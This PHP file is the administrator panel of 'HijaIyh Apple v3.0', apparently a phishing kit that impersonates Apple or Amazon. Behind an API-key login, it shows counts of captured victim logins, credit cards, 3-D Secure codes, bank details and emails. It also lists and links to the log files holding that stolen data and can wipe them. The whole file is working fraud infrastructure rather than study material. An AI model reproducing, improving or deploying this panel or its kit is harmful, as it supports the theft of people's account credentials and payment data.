<?php
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

require_once(dirname(__DIR__).'/autoloader.php');

?>
<!DOCTYPE html>
<html>
<head>
	<title>HijaIyh:Amz - Panel </title>
	<link rel="icon"  href="./HijaIyh_App/assets/img/hijaiyh-logo.png">
	<link rel="stylesheet" href="https://fedoracss.github.io/dist/css/fedora.min.css" type="text/css">
	<!-- <script src="https://kit.fontawesome.com/aafae70235.js"></script> -->
	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
</head>
<body>
	<style type="text/css">
		.angka{font-weight: bold;font-size:30px;float: right;margin-right: 10%}footer{font-size: 10px;font-weight: bold;font-family: arial;position: fixed;bottom: 0;right: 0;background: red;color: white;padding: 2px}
	</style>
<div class="container">

	<?php
	if(isset($_SESSION['panel'])){ 
?>	<div class="bg-dark text-white ">
	<h1 style="display: inline-block;">&nbsp;&nbsp;&nbsp;<i class="fa fa-code spacer-small"></i> HijaIyh:Amz</h1>&nbsp;&nbsp; |&nbsp;&nbsp;
	[<a href="?_=0" class="text-white">Stats</a>]
	[<a href="?_=1" class="text-white">Logs</a>]
	[<a href="?_=2" class="text-primary">Reset</a>]
	[<a href="./?<?=$core->parse_hijaiyh('sp','param');?>" target="_blank" class="text-success">Visit site</a>]
	[<a href="?_=3" class="text-danger">LogOut</a>]

</div><?php
	if($_GET['_'] == 0){
		?>

	<div class="grid mt-64 mb-2">
		<div class="set lg-4 bg-primary text-white spacer-medium"><i class="fa fa-users fa-2x"></i> Visitors <span class="angka"><?=$core->count_stats('visitor.hijaiyh.html');?></span></div>
        <div class="set lg-4 bg-success text-white spacer-medium"><i class="fa fa-sign-in fa-2x"></i> Login <span class="angka"><?=$core->count_stats('login.hijaiyh.html');?></span></div>
        	<div class="set lg-4 bg-warning text-white spacer-medium"><i class="fa fa-credit-card fa-2x"></i> Card <span class="angka"><?=$core->count_stats('ccs.hijaiyh.html');?></span></div>

	</div>
	<div class="grid mt-2 mb-2">
		<div class="set lg-3 text-white spacer-medium" style="background:#2c02ea"><i class="fa fa-cc-visa fa-2x"></i> 3dsecure <span class="angka"><?=$core->count_stats('3dsecure.hijaiyh.html');?></span></div>
        <div class="set lg-3 text-white spacer-medium" style="background:#436b00"><i class="fa fa-bank fa-2x"></i> Bank <span class="angka"><?=$core->count_stats('bank.hijaiyh.html');?></span></div>
		<div class="set lg-3 bg-danger text-white spacer-medium"><i class="fa fa-envelope fa-2x"></i> Email <span class="angka"><?=$core->count_stats('email.hijaiyh.html');?></span></div>
        <div class="set lg-3 bg-black text-white spacer-medium"><i class="fa fa-bug fa-2x"></i> BOTs <span class="angka"><?=$core->count_stats('bot.hijaiyh.html');?></span></div>
	</div>

	<?php
}elseif($_GET['_'] == 3)
{
	session_destroy();
	$core->redirect('?_');
}elseif($_GET['_'] == 1)
{
	?>
	<table class="bordered">
  <thead>
    <tr>
      <th> File name </th>
      <th> Size </th>
      <th> View </th>
    </tr>
  </thead>
  <tbody>
  	<?php
  	$file = scandir(__DIR__.'/stats/');
  	foreach($file as $x)
  	{
  		if($x == '.' || $x == '..' || preg_match("/index/",$x))continue;

  		echo "<tr><td>$x</td><td>".filesize(__DIR__.'/stats/'.$x)."</td><td><a href='./HijaIyh_App/stats/$x' target='_blank'>View</a></td></tr>";
  	}
  	?>

  </tbody>
</table>
<?php
}elseif($_GET['_'] == 2)
{
	$file = scandir(__DIR__.'/stats/');
  	foreach($file as $x)
  	{
  		if($x == '.' || $x == '..' || preg_match("/index/",$x))continue;

  		unlink(__DIR__.'/stats/'.$x);
  	}
	$core->redirect('?_=0');

}
}else{
	?><br><br><br>
	<div class="spacer-large pl-large pr-large bg-dark text-white" style="max-width: 70%;margin:0 auto;border-radius: 20px;box-shadow: 0px 0px 30px #333">
		<center><img src="./HijaIyh_App/assets/img/hijaiyh-logo.png" style="max-width: 100px;max-height: 100px">
			<h2>Login Panel</h2></center>
			<form method="post">
				<div class="grid"><div class="set lg-8 md-8 sm-12">
					<input type="text" class="input" name="api" placeholder="API KEY" >
				</div>
				<div class="set lg-4 md-4 sm-12">
					<button type="submit" class="btn primary full-width"><i class="fa fa-sign-in"></i> Login</button>
				</div>
			</div>
			</form>
		</div>
	<?php
	if(isset($_REQUEST['api']))
	{
		$api = trim($_REQUEST['api']);

		if($api == @file_get_contents(__DIR__.'/config/.api_key'))
		{
			$_SESSION['panel'] = $_SERVER['REMOTE_ADDR'];
			echo "<script>window.location.href='?_=0';</script>";
		}else{
			echo "<script>alert('wrong api key');window.location.href='?';</script>";
		}
	}

}

?>
</div>

<footer>copyright &copy; HijaIyh Production 2019. Thanks for support us!</footer>
</body>
</html>